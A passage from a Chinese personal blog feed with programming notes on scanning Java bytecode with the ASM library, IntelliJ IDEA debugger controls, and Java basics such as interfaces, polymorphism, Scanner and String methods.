class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> access, String name, String desc, String signature, String[] exceptions)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"at Method "</span> + name);</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        MethodVisitor superMV = <span class="keyword">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> DemoMethodVisitor(superMV, name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DemoMethodVisitor</span> <span class="keyword">extends</span> <span class="title">MethodVisitor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String methodName;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DemoMethodVisitor</span><span class="params">(MethodVisitor mv, String methodName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(Opcodes.ASM4, mv);</span><br><span class="line">        <span class="keyword">this</span>.methodName = methodName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"at Method ‘"</span> + methodName + <span class="string">"’ Begin..."</span>);</span><br><span class="line">        <span class="keyword">super</span>.visitCode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"at Method ‘"</span> + methodName + <span class="string">"’End."</span>);</span><br><span class="line">        <span class="keyword">super</span>.visitEnd();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>上面这段程序首先在第三行使用 ClassReader 去读取 DemoClass 类的字节码信息。</li>
<li>其次通过“cr.accept(new DemoClassVisitor(), ClassReader.SKIP_DEBUG);”方法开始Visitor扫描整个字节码。</li>
<li>SKIP_DEBUG选项的意义是在扫描过程中掠过所有有关行号方面的内容。</li>
<li>在DemoClassVisitor类中我们重写了visitMethod方法，当遇到方法的时候打印出方法名。</li>
<li>随后我们返回DemoMethodVisitor对象，用以输出方法的开始和结束。</li>
</ol>
<p>上面这段程序的输出如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">at Method &lt;init&gt;</span><br><span class="line">at Method ‘&lt;init&gt;’ Begin...</span><br><span class="line">at Method ‘&lt;init&gt;’End.</span><br><span class="line">at Method main</span><br><span class="line">at Method ‘main’ Begin...</span><br><span class="line">at Method ‘main’End.</span><br><span class="line">---ALL END---</span><br></pre></td></tr></table></figure>

<p>下面是这个MethodVisitor接口的所有方法定义:</p>
<p><img src="../images/ASM%E7%AC%94%E8%AE%B0/image-20200509163546690.png" alt="image-20200509163546690"></p>
<p>虽然该接口的方法数量如此之多，甚至是ClassVisitor接口的3倍以上。但是值得我们关心的接口只有下面这几个，其余的都是和代码有关系：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MethodVisitor.visitCode();</span><br><span class="line">MethodVisitor.visitMaxs(maxStack, maxLocals);</span><br><span class="line">MethodVisitor.visitEnd();</span><br></pre></td></tr></table></figure>

<ul>
<li>第一个方法：表示ASM开始扫描这个方法。</li>
<li>第二个方法：该方法是visitEnd之前调用的方法，可以反复调用。用以确定类方法在执行时候的堆栈大小。</li>
<li>第三个方法：表示方法输出完毕。</li>
</ul>
<h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><p>关于方法名或许读者注意到了在扫描这个类的时候，有一个特殊的方法被扫描到了“<init>”，这个方法就是传说中的构造方法。当Java在编译的时候没有发现类文件中有构造方法的定义会为其创建一个默认的无参构造方法。这个“<init>”就是那个由系统添加的构造方法。现在我们为类填写一个构造方法如下：</init></init></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DemoClass</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再次扫描这个类，你会发现它的结果和刚才是一样的，这是由于我们编写的构造方法替换了系统默认生成的那个。</p>
<h3 id="静态代码块"><a href="#静态代码块" class="headerlink" title="静态代码块"></a>静态代码块</h3><p>在Class我们接触过用“static {  }”包含的代码，这个是我们常说的静态代码块。这个代码快ASM在扫描字节码的时候也会遇到它，别以为这真的是一个什么代码块。所有的静态代码快最后都会放到“<clinit>”方法中。</clinit></p>
<p>静态代码快只有一个，现有下面这个的一个类。在编写这个类的时候我有意的写了两个不同的静态代码块的类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> a;</span><br><span class="line">        System.out.println(<span class="number">11</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> a;</span><br><span class="line">        System.out.println(<span class="number">22</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ASM在扫描这个类的时候你会发现虽然类中存在多个静态代码快，但是最后类文件中只会出现了一个“<clinit>”方法。JVM在编译Class的时候估计已经将多个静态代码块合并到一起了。</clinit></p>
<p><img src="../images/ASM%E7%AC%94%E8%AE%B0/image-20200509165603790.png" alt="image-20200509165603790"></p>
<h2 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h2><p>PUBLIC: 1<br>PRIVATE: 2<br>PROTECTED: 4<br>STATIC: 8<br>FINAL: 16<br>SYNCHRONIZED: 32<br>VOLATILE: 64<br>TRANSIENT: 128<br>NATIVE: 256<br>INTERFACE: 512<br>ABSTRACT: 1024<br>STRICT: 2048</p>
<p>Modifier提供了很多静态方法。如public static String toString(int mod)就可以输出该整数对应的所有的修饰符。public static boolean isPublic(int mod)就可以判断该整数对应的是不是包含public修饰符。</p>
]]></content>
      <categories>
        <category>静态分析</category>
      </categories>
      <tags>
        <tag>ASM</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA Debug笔记</title>
    <url>/IDEA-Debug%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>无惛惛之事者，无赫赫之功。</p>
</blockquote>
<p>今天来学习IDEA的Debug调试技巧。</p>
<a id="more"></a>

<h1 id="Debug简介和意义"><a href="#Debug简介和意义" class="headerlink" title="Debug简介和意义"></a>Debug简介和意义</h1><p>什么是程序DeBug？</p>
<ol>
<li><p>Debug，是程序开发人员必会的一项调试程序的技能。</p>
</li>
<li><p>企业中程序开发和程序调试的比例为1:1.5，可以说如果你不会调试程序，你就没有办法从事编程工作。</p>
</li>
</ol>
<p>Debug能帮助我们做什么？</p>
<ol>
<li>追踪代码的运行流程。</li>
<li>程序运行异常定位。</li>
<li>线上问题追踪。</li>
</ol>
<p>Debug对于程序学习者的意义</p>
<ol>
<li>通过调试能够更好的查看程序的执行流程。</li>
<li>复杂的程序逻辑，通过老师的口述讲解，很难理解清楚，这个时候借助调试能够很好的帮助同学们理解程序。</li>
<li>定位问题，提高自我解决问题的能力。</li>
</ol>
<h1 id="IDEA中的Debug步骤"><a href="#IDEA中的Debug步骤" class="headerlink" title="IDEA中的Debug步骤"></a>IDEA中的Debug步骤</h1><ol>
<li><p>设置断点（F9）</p>
</li>
<li><p>调试程序（8个按钮）</p>
</li>
</ol>
<p><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_162216.jpg" alt="2019-09-28_162216"></p>
<table>
<thead>
<tr>
<th>钮</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_163744.jpg" alt></td>
<td>(Alt + F10)：如果你的光标在其它行或其它页面，点击这个按钮可跳转到当前代码执行的行</td>
</tr>
<tr>
<td><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164022.jpg" alt></td>
<td>(F8)：步过，一行一行地往下走，如果这一行上有方法不会进入方法。</td>
</tr>
<tr>
<td><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_162345.jpg" alt>))</td>
<td>(F7)：步入。如果当前行有方法，可以进入方法内部，一般用于进入自定义方法内，不会进入官方类库的方法。</td>
</tr>
<tr>
<td><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164200.jpg" alt></td>
<td>(Alt + Shift + F7)：强制步入，能进入任何方法，查看底层源码的时候可以用这个进入官方类库的方法。</td>
</tr>
<tr>
<td><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164215.jpg" alt></td>
<td>(Shift + F8)：步出，从步入的方法内退出到方法调用处，此时方法已执行完毕，只是还没有完成赋值。</td>
</tr>
<tr>
<td><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164428.jpg" alt></td>
<td>回退断点。</td>
</tr>
<tr>
<td><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164418.jpg" alt></td>
<td>(Alt + F9)：运行到光标处，你可以将光标定位到你需要查看的那一行，然后使用这个功能，代码会运行至光标行，而不需要打断点。</td>
</tr>
<tr>
<td><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164437.jpg" alt></td>
<td>(Alt + F8)：计算表达式。</td>
</tr>
</tbody></table>
<ol start="3">
<li>观察变量<ol>
<li>查看变量有三种方式：<ol>
<li>程序区查看变量</li>
<li>Debugger的Variables中查看变量</li>
<li>鼠标悬停到变量名上会弹出当前变量的值</li>
</ol>
</li>
</ol>
</li>
</ol>
<p><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_165050.jpg" alt="2019-09-28_165050"></p>
<ol start="4">
<li>查看输出</li>
</ol>
<h1 id="跳转到当前代码执行的行"><a href="#跳转到当前代码执行的行" class="headerlink" title="跳转到当前代码执行的行"></a>跳转到当前代码执行的行</h1><p><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_163744.jpg" alt="2019-09-28_163744"></p>
<ul>
<li><p>跳转到当前代码执行的行（Alt + F10）</p>
</li>
<li><p>作用</p>
<ul>
<li>使程序窗口切换到当前正在运行的程序处。</li>
</ul>
</li>
</ul>
<h1 id="步过调试的使用"><a href="#步过调试的使用" class="headerlink" title="步过调试的使用"></a>步过调试的使用</h1><ul>
<li><p>步过调试</p>
<ul>
<li>步过调试按钮（F8）<img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164022.jpg" alt="2019-09-28_164022"></li>
</ul>
</li>
<li><p>作用</p>
<ul>
<li>步过，一行一行地往下走，如果这一行上有方法不会进入方法。</li>
<li>常用于调试过程中不想进入调用的方法体的情况。</li>
</ul>
</li>
</ul>
<h1 id="步入调试的使用"><a href="#步入调试的使用" class="headerlink" title="步入调试的使用"></a>步入调试的使用</h1><p>步入调试</p>
<ul>
<li>步过调试按钮（F7）</li>
</ul>
<ul>
<li><p>作用</p>
<ul>
<li><p>步入，一行一行地往下走，如果这一行上有方法，则进入方法内部。</p>
</li>
<li><p>一般用于进入自定义方法内，不会进入官方类库的方法。</p>
</li>
</ul>
</li>
</ul>
<h1 id="强制步入调试的使用"><a href="#强制步入调试的使用" class="headerlink" title="强制步入调试的使用"></a>强制步入调试的使用</h1><ul>
<li><p>强制步入调试</p>
<ul>
<li>强制步入调试按钮（Alt + Shift + F7）<img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164200.jpg" alt></li>
</ul>
</li>
<li><p>作用</p>
<ul>
<li><p>进入官方类库方法</p>
</li>
<li><p>帮助我们学习和查看JDK源码</p>
</li>
</ul>
</li>
</ul>
<h1 id="步出调试的使用"><a href="#步出调试的使用" class="headerlink" title="步出调试的使用"></a>步出调试的使用</h1><ul>
<li><p>步出调试</p>
<ul>
<li>步出调试按钮（Shift + F8）<img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164215.jpg" alt></li>
</ul>
</li>
<li><p>作用</p>
<ul>
<li>从方法内退出到方法调用处。</li>
<li>调试的时候，有时候会跳入到自己不想查看的方法体，这个时候使用步出。</li>
</ul>
</li>
</ul>
<h1 id="回退断点调试的使用"><a href="#回退断点调试的使用" class="headerlink" title="回退断点调试的使用"></a>回退断点调试的使用</h1><ul>
<li><p>回退断点</p>
<ul>
<li>回退断点按钮 <img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164428.jpg" alt></li>
</ul>
</li>
<li><p>作用</p>
<ul>
<li><p>回退到当前方法的调用处。</p>
</li>
<li><p>当想重新查看该方法体的执行过程时，不用重新启动Debug，可以使用回退断点方式。</p>
</li>
</ul>
</li>
</ul>
<h1 id="运行到光标处"><a href="#运行到光标处" class="headerlink" title="运行到光标处"></a>运行到光标处</h1><p>运行到光标处</p>
<ul>
<li>运行光标处按钮 （F9）<img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164418-8044630.jpg" alt></li>
<li>作用<ul>
<li>使程序运行到光标处，而无需设置断点。</li>
</ul>
</li>
</ul>
<h1 id="计算表达式"><a href="#计算表达式" class="headerlink" title="计算表达式"></a>计算表达式</h1><ul>
<li><p>计算表达式</p>
<ul>
<li>计算表达式按钮（Alt + F8）<img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-09-28_164437.jpg" alt="2019-09-28_164437"></li>
</ul>
</li>
</ul>
<p><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-10-03_182159.jpg" alt="2019-10-03_182159"></p>
<ul>
<li>作用<ul>
<li>设置变量，在计算表达式的框里，可以改变变量的值，这样有时候就能很方便我们去调试各种值的情况了。 </li>
</ul>
</li>
</ul>
<h1 id="条件断点"><a href="#条件断点" class="headerlink" title="条件断点"></a>条件断点</h1><ul>
<li><p>条件断点</p>
<ul>
<li>右键单击断点处，可以设置进入断点的条件</li>
</ul>
</li>
</ul>
<p><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-10-03_182101.jpg" alt="2019-10-03_182101"></p>
<ul>
<li>作用<ul>
<li>通过设置断点条件，在满足条件时，才停在断点处，否则直接运行。</li>
</ul>
</li>
</ul>
<h1 id="多线程调试"><a href="#多线程调试" class="headerlink" title="多线程调试"></a>多线程调试</h1><ul>
<li>步骤<ul>
<li>多线程调试，需要调整断点挂起级别为Thread</li>
</ul>
</li>
</ul>
<p><img src="../images/IDEA-Debug%E7%AC%94%E8%AE%B0/2019-10-05_164127.jpg" alt="2019-10-05_164127"></p>
<ul>
<li>Frame中选择线程进行调试</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础温习</title>
    <url>/Java%E5%9F%BA%E7%A1%80%E6%B8%A9%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>锲而不舍，金石可镂。</p>
</blockquote>
<p>今天来总结Java基础，来填本科的坑。</p>
<p>本篇将会是一篇长文，会陆续更新。</p>
<a id="more"></a>

<h1 id="Java应用类型"><a href="#Java应用类型" class="headerlink" title="Java应用类型"></a>Java应用类型</h1><p>一共五种：</p>
<p>类 / 数组 / 接口 / 枚举 / 注解</p>
<h1 id="接口与抽象类的区别"><a href="#接口与抽象类的区别" class="headerlink" title="接口与抽象类的区别"></a>接口与抽象类的区别</h1><p>一个类只能继承一个父类，但是可以实现多个接口</p>
<h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><p>只要类中有抽象方法，那么他就是抽象类</p>
<p>抽象方法：abstract+只有方法名 默认public abstract修饰</p>
<p>final 与 abstract不可以同时修饰</p>
<p>抽象类可以有成员变量、构造方法、抽象方法</p>
<p>只支持单继承</p>
<p>继承抽象类的子类必须extends，实现抽象类中的<strong>全部抽象方法</strong></p>
<h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>接口中方法默认 public abstract修饰，不需要特意声明</p>
<p>一个类如果实现了接口，那么就需要<strong>实现接口的全部方法</strong></p>
<p>接口中方法默认public abstract </p>
<p>接口中字段默认public static final</p>
<p>在JDK8中可以定义static静态方法 &amp; default方法 default修饰方法的有默认方法体，实现类中可以重写也可以不重写</p>
<p>接口可以支持多继承</p>
<h1 id="编译类型与运行类型"><a href="#编译类型与运行类型" class="headerlink" title="编译类型与运行类型"></a>编译类型与运行类型</h1><p>经典例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Father child = <span class="keyword">new</span> son();</span><br><span class="line">编译类型         运行类型</span><br><span class="line">  </span><br><span class="line">child.doWork();</span><br></pre></td></tr></table></figure>

<p>理解：</p>
<p>编译类型由声明该变量的类型决定<code>声明啥是啥</code>，运行类型由实际赋值给的变量决定<code>new啥是啥</code></p>
<p>如果这两个类型不一样，那么就是多态。</p>
<p>属性不具有多态，也就是对象在调用属性的时候，总会访问它<code>编译类型</code>的属性，而不是运行类型。</p>
<p>首先声明了一个引用类型<code>Father child</code>，用它来指向son类的一个实例。</p>
<p>在程序运行时，首先会调用父类的构造器，然后再调用子类的构造器。</p>
<p>在编译过程中，会自动检查引用变量<code>Father child</code>的编译类型，发现是Father类，会检查是否拥有<code>doWork</code>方法。</p>
<p>但是在JVM实际运行中，调用的是子类的<code>doWork</code>方法，而不是父类的，这就是运行时多态。</p>
<p>找方法，先找子类：</p>
<p>如果子类没有，再去找父类。</p>
<h1 id="方法重写override-与重载overload"><a href="#方法重写override-与重载overload" class="headerlink" title="方法重写override 与重载overload"></a>方法重写override 与重载overload</h1><h2 id="Override-重写-子类对父类方法重写）"><a href="#Override-重写-子类对父类方法重写）" class="headerlink" title="Override 重写 (子类对父类方法重写）"></a>Override 重写 (子类对父类方法重写）</h2><p><strong>名称+参数列表必须完全相同</strong></p>
<p>返回值类型 如果不同的话，必须是兼容类型 </p>
<p>构造方法 final 和 static方法 不能重写</p>
<h2 id="Overload-重载-一个方法内"><a href="#Overload-重载-一个方法内" class="headerlink" title="Overload 重载 (一个方法内)"></a>Overload 重载 (一个方法内)</h2><p>方法名称必须相同，参数必须不同</p>
<p>返回值没要求</p>
<h1 id="Scanner-类"><a href="#Scanner-类" class="headerlink" title="Scanner 类"></a>Scanner 类</h1><blockquote>
<p>java.lang.String : 接受用户的键盘输入</p>
</blockquote>
<p>导包的一般步骤：</p>
<ol>
<li><p>导包：</p>
<p>import 包路径.类名称</p>
<p>如果需要使用的目标类，和当前位于同一个包下，则可以省略导包语句不写。</p>
<p>只有<code>java.lang</code>包下的内容不需要导包，其他的包都需要import语句。</p>
</li>
<li><p>创建：</p>
<p>类名称 对象名 = new 类名称（）；</p>
</li>
<li><p>使用</p>
<p>对象名.方法名（）;</p>
</li>
</ol>
<p>Demo:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"><span class="keyword">int</span> i = sc.nextInt();<span class="comment">//接收一个int数字</span></span><br><span class="line">String str = sc.next();<span class="comment">//接收一个String字符串</span></span><br></pre></td></tr></table></figure>

<h1 id="匿名对象"><a href="#匿名对象" class="headerlink" title="匿名对象"></a>匿名对象</h1><p>创建对象的标准格式：</p>
<figure class="highlight plain"><figcaption><span>对象名 </span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">匿名对象就是只有右边的对象，没有左边的名字和赋值运算符。</span><br><span class="line"></span><br><span class="line">``` new 类名称（）；</span><br></pre></td></tr></table></figure>

<p>匿名对象只能使用唯一的一次，下次再用不得不再创建一个新对象。</p>
<p>如果确定有一个对象只需要使用唯一的一次，就可以用匿名对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> num = <span class="keyword">new</span> Scanner(System.in).nextInt();</span><br><span class="line">System.out.println(<span class="string">"输入的是"</span>+num);</span><br></pre></td></tr></table></figure>



<h1 id="Random类"><a href="#Random类" class="headerlink" title="Random类"></a>Random类</h1><blockquote>
<p>java.util.Random 生成伪随机数。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Random r = <span class="keyword">new</span> Random();</span><br><span class="line"><span class="keyword">int</span> i = r.nextInt();</span><br><span class="line"><span class="comment">//public int nextInt(int n)</span></span><br><span class="line"><span class="comment">//返回一个随机数，范围在[0，n）之间，左闭右开</span></span><br></pre></td></tr></table></figure>

<h1 id="ArrayList类"><a href="#ArrayList类" class="headerlink" title="ArrayList类"></a>ArrayList类</h1><blockquote>
<p>java.util.ArrayList</p>
<p>大小可变的集合，长度动态增长</p>
<p>ArrayList<String> list = new ArrayList&lt;&gt;();</String></p>
</blockquote>
<h2 id="成员方法"><a href="#成员方法" class="headerlink" title="成员方法"></a>成员方法</h2><ul>
<li><code>public boolean add(E e)</code>：将指定的元素添加到集合尾部</li>
<li><code>public E remove(int index)</code>：移除指定下标元素，返回被删除的元素。</li>
<li><code>public E get(int index)</code>：捕获此集合中指定位置上的元素。</li>
<li><code>public int size()</code>：返回此集合中的元素数。遍历集合时，可以控制索引范围，防止越界。</li>
</ul>
<h2 id="包装类"><a href="#包装类" class="headerlink" title="包装类"></a>包装类</h2><p>ArrayList对象不能存储基本类型，只能存储引用类型的数据。</p>
<p>类似<code>&lt;int&gt;</code>不能写，但是存储基本数据类型对应的包装类型是可以的。所以，想要存储基本类型数据，必须转换后才能编写，转换写法如下：</p>
<p><img src="../images/Java%E5%9F%BA%E7%A1%80%E6%B8%A9%E4%B9%A0/image-20200428120710735.png" alt="image-20200428120710735"></p>
<h1 id="String类"><a href="#String类" class="headerlink" title="String类"></a>String类</h1><blockquote>
<p>java.lang.String  底层是字符数组</p>
</blockquote>
<h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><ul>
<li><code>public String(char[] value)</code>：通过当前参数中的字符数组来构造新的String。</li>
<li><code>public String(byte[] bytes)</code>：通过使用平台的默认字符集解码当前参数中的字节数组来构造新的 String。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">String_Demo01</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 创建字符串对象</span></span><br><span class="line">String s1 = <span class="string">"hello"</span>;</span><br><span class="line">String s2 = <span class="string">"hello"</span>;</span><br><span class="line">String s3 = <span class="string">"HELLO"</span>;</span><br><span class="line"><span class="comment">// boolean equals(Object obj):比较字符串的内容是否相同</span></span><br><span class="line">System.out.println(s1.equals(s2)); <span class="comment">// true</span></span><br><span class="line">System.out.println(s1.equals(s3)); <span class="comment">// false</span></span><br><span class="line">System.out.println(<span class="string">"‐‐‐‐‐‐‐‐‐‐‐"</span>);</span><br><span class="line"><span class="comment">//boolean equalsIgnoreCase(String str):比较字符串的内容是否相同,忽略大小写</span></span><br><span class="line">System.out.println(s1.equalsIgnoreCase(s2)); <span class="comment">// true</span></span><br><span class="line">System.out.println(s1.equalsIgnoreCase(s3)); <span class="comment">// true</span></span><br><span class="line">System.out.println(<span class="string">"‐‐‐‐‐‐‐‐‐‐‐"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="获取功能的方法"><a href="#获取功能的方法" class="headerlink" title="获取功能的方法"></a>获取功能的方法</h2><ul>
<li><p><code>public int length ()</code>：返回此字符串的长度。 </p>
</li>
<li><p><code>public String concat (String str)</code>：将指定的字符串连接到该字符串的末尾。 </p>
</li>
<li><p><code>public char charAt (int index)</code> ：返回指定索引处的 char值。 </p>
</li>
<li><p><code>public int indexOf (String str)</code> ：返回指定子字符串第一次出现在该字符串内的索引。</p>
</li>
<li><p><code>public String substring (int beginIndex)</code> ：返回一个子字符串，从beginIndex开始截取字符串到字符 串结尾。 </p>
</li>
<li><p><code>public String substring (int beginIndex, int endIndex)</code> ：返回一个子字符串，从beginIndex到 endIndex截取字符串。含beginIndex，不含endIndex。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">String_Demo02</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//创建字符串对象</span></span><br><span class="line">String s = <span class="string">"helloworld"</span>;</span><br><span class="line"><span class="comment">// int length():获取字符串的长度，其实也就是字符个数</span></span><br><span class="line">System.out.println(s.length());</span><br><span class="line">System.out.println(<span class="string">"‐‐‐‐‐‐‐‐"</span>);</span><br><span class="line"><span class="comment">// String concat (String str):将将指定的字符串连接到该字符串的末尾.</span></span><br><span class="line">String s = <span class="string">"helloworld"</span>;</span><br><span class="line">String s2 = s.concat(<span class="string">"**hello again"</span>);</span><br><span class="line">System.out.println(s2);<span class="comment">// helloworld**hello again</span></span><br><span class="line"><span class="comment">// char charAt(int index):获取指定索引处的字符</span></span><br><span class="line">System.out.println(s.charAt(<span class="number">0</span>));</span><br><span class="line">System.out.println(s.charAt(<span class="number">1</span>));</span><br><span class="line">System.out.println(<span class="string">"‐‐‐‐‐‐‐‐"</span>);</span><br><span class="line"><span class="comment">// int indexOf(String str):获取str在字符串对象中第一次出现的索引,没有返回‐1</span></span><br><span class="line">System.out.println(s.indexOf(<span class="string">"l"</span>));</span><br><span class="line">System.out.println(s.indexOf(<span class="string">"owo"</span>));</span><br><span class="line">System.out.println(s.indexOf(<span class="string">"ak"</span>));</span><br><span class="line">System.out.println(<span class="string">"‐‐‐‐‐‐‐‐"</span>);</span><br><span class="line"><span class="comment">// String substring(int start):从start开始截取字符串到字符串结尾</span></span><br><span class="line">System.out.println(s.substring(<span class="number">0</span>));</span><br><span class="line">System.out.println(s.substring(<span class="number">5</span>));</span><br><span class="line">System.out.println(<span class="string">"‐‐‐‐‐‐‐‐"</span>);</span><br><span class="line"><span class="comment">// String substring(int start,int end):从start到end截取字符串。含start，不含end,左闭右开</span></span><br><span class="line">System.out.println(s.substring(<span class="number">0</span>, s.length()));</span><br><span class="line">System.out.println(s.substring(<span class="number">3</span>,<span class="number">8</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="转换功能的方法"><a href="#转换功能的方法" class="headerlink" title="转换功能的方法"></a>转换功能的方法</h2><ul>
<li><p><code>public char[] toCharArray ()</code>：将此字符串转换为新的字符数组。 </p>
</li>
<li><p><code>public byte[] getBytes ()</code>：使用平台的默认字符集将该 String编码转换为新的字节数组。 </p>
</li>
<li><p><code>public String replace (CharSequence target, CharSequence replacement)</code>：将与target匹配的字符串使用replacement字符串替换。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">String_Demo03</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//创建字符串对象</span></span><br><span class="line">String s = <span class="string">"abcde"</span>;</span><br><span class="line"><span class="comment">// char[] toCharArray():把字符串转换为字符数组</span></span><br><span class="line"><span class="keyword">char</span>[] chs = s.toCharArray();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> x = <span class="number">0</span>; x &lt; chs.length; x++) &#123;</span><br><span class="line">System.out.println(chs[x]);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">"‐‐‐‐‐‐‐‐‐‐‐"</span>);</span><br><span class="line"><span class="comment">// byte[] getBytes ():把字符串转换为字节数组</span></span><br><span class="line"><span class="keyword">byte</span>[] bytes = s.getBytes();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> x = <span class="number">0</span>; x &lt; bytes.length; x++) &#123;</span><br><span class="line">System.out.println(bytes[x]);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">"‐‐‐‐‐‐‐‐‐‐‐"</span>);</span><br><span class="line"><span class="comment">// 替换字母it为大写IT</span></span><br><span class="line">String str = <span class="string">"itcast itheima"</span>;</span><br><span class="line">String replace = str.replace(<span class="string">"it"</span>, <span class="string">"IT"</span>);</span><br><span class="line">System.out.println(replace); <span class="comment">// ITcast ITheima</span></span><br><span class="line">System.out.println(<span class="string">"‐‐‐‐‐‐‐‐‐‐‐"</span>);</span><br><span 